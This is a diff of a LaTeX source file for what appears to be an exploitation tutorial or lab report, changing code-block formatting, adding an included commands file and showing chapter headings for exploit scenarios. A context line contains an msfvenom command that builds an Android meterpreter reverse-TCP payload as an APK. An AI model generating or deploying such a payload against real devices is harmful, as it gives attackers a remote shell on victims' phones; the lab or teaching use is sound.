@@ -701,11 +701,19 @@ baselinestretch=1.2,
 bgcolor=LightBlue,
 fontsize=\footnotesize,
 breaklines,
-breaksymbolleft=\carriagereturn
 ]
 {Shell}
 msfvenom –p android/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 R > /root/filename.apk
 \end{minted}
+
+\inputminted[
+frame=lines,
+framesep=2mm,
+baselinestretch=1.2,
+bgcolor=LightBlue,
+fontsize=\footnotesize,
+breaklines,
+]{Text}{commands.txt}
 \chapter{Scenario 2: Windows exploit}
 \chapter{Additional readings and miscellaneous information}
 \url{https://citizenlab.ca/}
